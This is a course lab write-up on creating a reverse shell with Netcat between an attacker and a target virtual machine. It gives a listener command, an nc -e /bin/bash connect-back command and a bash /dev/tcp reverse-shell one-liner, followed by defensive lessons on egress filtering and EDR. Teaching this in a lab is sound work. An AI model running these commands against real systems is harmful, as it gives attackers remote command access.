# Using Netcat for Reverse Shell

## Course  
CYB/550 – Technical Enterprise Security

## Objective  
This lab demonstrates how to use Netcat (nc) to create a reverse shell connection. A reverse shell allows a remote attacker to gain command-line access to a target system by initiating an outbound connection.

## Tools Used  
- Netcat (nc)  
- Two virtual machines (Attacker and Target)  
- Linux terminal

## Procedure  
- On the attacker machine, set up a Netcat listener:
    ```bash
    nc -lvnp 4444
- On the target machine, initiate the reverse connection using:
    ```bash
    nc [attacker IP] 4444 -e /bin/bash
- If Netcat does not support the -e flag, use a bash-based payload:
    ```bash
    bash -i >& /dev/tcp/[attacker IP]/4444 0>&1
- Confirm that a remote shell session opens on the attacker's terminal
- Execute commands remotely to demonstrate shell access (e.g., whoami, uname -a, ls)

## Results
- Listener on attacker machine received incoming connection
- Target system shell access successfully established remotely
- Attacker could run commands and interact with the target system as if local
- Demonstrated real-world risk from exposed or misconfigured services

## Lessons Learned
- Reverse shells are a powerful tool used in exploitation and post-exploitation stages
- Firewalls and egress filtering are critical to prevent outbound unauthorized connections
- Security controls like endpoint detection and response (EDR) tools can help identify reverse shell behavior
- Organizations should restrict command execution and monitor suspicious connections on all endpoints
